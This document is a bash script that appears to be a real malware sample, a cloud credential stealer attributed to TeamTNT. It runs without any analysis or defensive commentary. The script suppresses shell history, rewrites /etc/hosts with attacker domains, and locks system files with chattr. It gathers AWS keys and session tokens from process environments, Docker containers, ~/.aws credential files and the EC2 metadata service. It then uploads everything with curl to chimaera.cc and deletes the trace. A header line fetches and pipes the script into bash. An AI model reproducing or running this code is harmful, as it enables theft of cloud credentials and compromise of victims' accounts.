#!/bin/bash
#
#	TITLE:		GRABBER_aws-cloud
#	AUTOR:		hilde@teamtnt.red
#	VERSION:	V0.00.1
#	DATE:		15.08.2021
#
#	SRC:        wget -O- http://45.9.148.182/cmd/GRABBER_aws-cloud.sh | bash
#
########################################################################

export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null

export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin

if [[ "$(hostname)" = "HaXXoRsMoPPeD" ]]; then exit ; fi
if [[ ! -z "$DFGZRFVGRF" ]]; then exit ; fi


STEALER_OUT="/var/tmp/TeamTNT_AWS_STEALER.txt"

if [ "$(uname -m)" = "aarch64" ]; then SYSTEM_TYP="aarch64"
elif [ "$(uname -m)" = "x86_64" ];  then SYSTEM_TYP="x86_64"
elif [ "$(uname -m)" = "i386" ];    then SYSTEM_TYP="i386"
else SYSTEM_TYP="i386"; fi

T1O=13


function INIT_MAIN(){
export DFGZRFVGRF=""
INIT_SECOND
AWS_SYSTEM_ENV
AWS_DOCKER_ENV
AWS_CRED_FILES
AWS_META_DATA_CREDS
AWS_META_DATA
AWS_DATA_LOGFILE_UPLOAD
}

function INIT_SECOND(){
SYSTEM_FIX
DNS_MODIFIKATIONEN
SYSTEM_FIX
}

function DLOAD_BYPASS() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

function UNLOCK_FILE(){
FILE_TO_UNLOCK=$1
if [[ "$(which chattr)" = "0" ]]; then chattr -ia $FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which tntrecht)" = "0" ]]; then tntrecht -ia $FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which ichdarf)" = "0" ]]; then ichdarf -ia $FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which C_hg_chattr)" = "0" ]]; then C_hg_chattr -ia $FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v chattr)" = "0" ]]; then chattr -ia $FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v tntrecht)" = "0" ]]; then tntrecht -ia $FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v ichdarf)" = "0" ]]; then ichdarf -ia $FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v C_hg_chattr)" = "0" ]]; then C_hg_chattr -ia $FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
}

function LOCK_FILE(){
FILE_TO_LOCK=$1
if [[ "$(which chattr)" = "0" ]]; then chattr +a $FILE_TO_LOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which tntrecht)" = "0" ]]; then tntrecht +a $FILE_TO_LOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which ichdarf)" = "0" ]]; then ichdarf +a $FILE_TO_LOCK 2>/dev/null 1>/dev/null; fi
if [[ "$(which C_hg_chattr)" = "0" ]]; then C_hg_chattr +a $FILE_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v chattr)" = "0" ]]; then chattr +a $FILE_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v tntrecht)" = "0" ]]; then tntrecht +a $FILE_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v ichdarf)" = "0" ]]; then ichdarf +a $FILE_TO_LOCK 2>/dev/null 1>/dev/null; fi
	if [[ "$(command -v C_hg_chattr)" = "0" ]]; then C_hg_chattr +a $FILE_TO_LOCK 2>/dev/null 1>/dev/null; fi
}

function TNT_PM(){
# TNT_PM (TeamTNT Package Managing)
BINARY=$1
APKPACK=$2
APTPACK=$3
YUMPACK=$4
if ! type $BINARY 2>/dev/null 1>/dev/null; then 
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add $APKPACK 2>/dev/null 1>/dev/null ; fi
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y $YUMPACK 2>/dev/null 1>/dev/null; fi ; fi
	if ! type $BINARY 2>/dev/null 1>/dev/null; then 
	if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk info | xargs apk fix 2>/dev/null 1>/dev/null ; fi
	if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK --reinstall 2>/dev/null 1>/dev/null ; fi
	if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum reinstall -y $YUMPACK 2>/dev/null 1>/dev/null ; fi ; 	fi
}

function SYSTEM_FIX(){
for TNT_DIR in ${TNT_DIR_ARRAY[@]}; do UNLOCK_FILE $TNT_DIR 2>/dev/null 1>/dev/null; done
for TNT_FILE in ${TNT_FILE_ARRAY[@]}; do UNLOCK_FILE $TNT_FILE 2>/dev/null 1>/dev/null; done
}

function TNT_IER(){
# IF_EXIST_REMOVE
TNT_TEXT=$1
TNT_FILE=$2
if [[ "$(grep $TNT_TEXT $TNT_FILE)" ]]; then
UNLOCK_FILE $TNT_FILE
sed -i '/'$TNT_TEXT'/d' $TNT_FILE 2>/dev/null
LOCK_FILE $TNT_FILE
fi

}

function DNS_MODIFIKATIONEN(){
if [[ ! "$(grep '45.9.148.108 chimaera.cc' /etc/hosts)" ]]; then TNT_IER chimaera /etc/hosts; UNLOCK_FILE /etc/hosts
echo "45.9.148.108 chimaera.cc" >> /etc/hosts 2>/dev/null; LOCK_FILE /etc/hosts; fi

if [[ ! "$(grep '45.9.148.108 teamtnt.red' /etc/hosts)" ]]; then TNT_IER teamtnt /etc/hosts; UNLOCK_FILE /etc/hosts
echo "45.9.148.108 teamtnt.red" >> /etc/hosts 2>/dev/null; LOCK_FILE /etc/hosts; fi

if [[ ! "$(grep 'nameserver 8.8.8.8\|nameserver 8.8.4.4' /etc/resolv.conf)" ]]; then 
TNT_IER nameserver /etc/resolv.conf; fi

if [[ ! "$(grep 'nameserver 8.8.8.8' /etc/resolv.conf)" ]]; then UNLOCK_FILE /etc/resolv.conf
echo "nameserver 8.8.8.8" >> /etc/resolv.conf 2>/dev/null; LOCK_FILE /etc/resolv.conf; fi

if [[ ! "$(grep 'nameserver 8.8.4.4' /etc/resolv.conf)" ]]; then UNLOCK_FILE /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf 2>/dev/null; LOCK_FILE /etc/resolv.conf; fi
}



function AWS_SYSTEM_ENV(){
ALL_SYSTEM_ENV=$(strings /proc/*/env* | sort -u | grep 'AWS')
if [ ! -z "$ALL_SYSTEM_ENV" ]; then echo "Alle AWS Systemvariablen" >> $STEALER_OUT ; echo '~~~~~~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
for ALLSYSTEMENV in ${ALL_SYSTEM_ENV[@]}; do
echo $ALLSYSTEMENV >> $STEALER_OUT
done
echo -e '\n\n' >> $STEALER_OUT
curl -sLk http://169.254.169.254$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI >> $STEALER_OUT
echo -e '\n\n' >> $STEALER_OUT
fi
}

function AWS_DOCKER_ENV(){
if type docker 2>/dev/null 1>/dev/null; then
DOCKER_ENV=$(docker inspect $(docker ps -q) | sort -u | grep 'AWS')
if [ ! -z "$DOCKER_ENV" ]; then echo "Docker Systemvariablen:" >> $STEALER_OUT ; echo '~~~~~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
for DOCKERENV in ${DOCKER_ENV[@]}; do
echo $DOCKERENV >> $STEALER_OUT
done
echo -e '\n\n' >> $STEALER_OUT
fi
fi
}

function AWS_CRED_FILES(){
ROOT_CRED_FILE=$(cat /root/.aws/credentials 2>/dev/null | grep 'aws_access_key_id\|aws_secret_access_key\|aws_session_token')
if [ ! -z "$ROOT_CRED_FILE" ]; then echo "AWS root CredFiles:" >> $STEALER_OUT ; echo '~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
echo -e $ROOT_CRED_FILE | sed 's/aws_/\naws_/g' | sed 's/aws_access_key_id/\naws_access_key_id/g' >> $STEALER_OUT
echo -e '\n\n' >> $STEALER_OUT ; fi

USER_CRED_FILE=$(cat /home/*/.aws/credentials 2>/dev/null | grep 'aws_access_key_id\|aws_secret_access_key\|aws_session_token')
if [ ! -z "$USER_CRED_FILE" ]; then echo "AWS user CredFiles:" >> $STEALER_OUT ; echo '~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
echo -e $USER_CRED_FILE | sed 's/aws_/\naws_/g' | sed 's/aws_access_key_id/\naws_access_key_id/g' >> $STEALER_OUT
echo -e '\n\n' >> $STEALER_OUT ; fi
}

function AWS_META_DATA_CREDS(){

export TNT_AWS_ACCESS_KEY=$(curl --max-time $T1O --connect-timeout $T1O -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/) | grep 'AccessKeyId' | sed 's/  "AccessKeyId" : "/aws_access_key_id = /g' | sed 's/",//g')
  
if [ ! -z "$TNT_AWS_ACCESS_KEY" ]; then
export TNT_AWS_SECRET_KEY=$(curl --max-time $T1O --connect-timeout $T1O -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/) | grep 'SecretAccessKey' | sed 's/  "SecretAccessKey" : "/aws_secret_access_key = /g' | sed 's/",//g')
fi

if [ ! -z "$TNT_AWS_SECRET_KEY" ]; then
export TNT_AWS_SESSION_TOKEN=$(curl --max-time $T1O --connect-timeout $T1O -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/) | grep 'Token' | sed 's/  "Token" : "/aws_session_token = /g' | sed 's/",//g')
fi

if ! ( [ -z "$TNT_AWS_ACCESS_KEY" ] || [ -z "$TNT_AWS_SECRET_KEY" ] || [ -z "$TNT_AWS_SESSION_TOKEN" ] ); then
#sed -i 's/[default]/[default_'$RANDOM']/g' ~/.aws/credentials
echo "AWS_META-DATA CREDS:" >> $STEALER_OUT
echo '~~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
echo '[default]' >> $STEALER_OUT
echo $TNT_AWS_ACCESS_KEY >> $STEALER_OUT
echo $TNT_AWS_SECRET_KEY >> $STEALER_OUT
echo $TNT_AWS_SESSION_TOKEN >> $STEALER_OUT
echo -e '\n\n' >> $STEALER_OUT
fi
}




function AWS_META_DATA(){

if [[ ! -z "$AWS_SHARED_CREDENTIALS_FILE" ]]; then 
echo "AWS_SHARED_CREDENTIALS_FILE:" >> $STEALER_OUT
echo '~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
cat $AWS_SHARED_CREDENTIALS_FILE >> $STEALER_OUT
echo -e '\n\n' >> $STEALER_OUT
fi

if [[ ! -z "$AWS_CONFIG_FILE" ]]; then 
echo "AWS_CONFIG_FILE:" >> $STEALER_OUT
echo '~~~~~~~~~~~~~~~~~~~' >> $STEALER_OUT
cat $AWS_CONFIG_FILE >> $STEALER_OUT
echo -e '\n\n' >> $STEALER_OUT
fi
}





function AWS_DATA_LOGFILE_UPLOAD(){
if [ -f $STEALER_OUT ]; then
cat $STEALER_OUT
curl -F 'userfile=@/var/tmp/TeamTNT_AWS_STEALER.txt' http://chimaera.cc/in/AWS.php
rm -f $STEALER_OUT 2>/dev/null 1>/dev/null
fi
}




INIT_MAIN

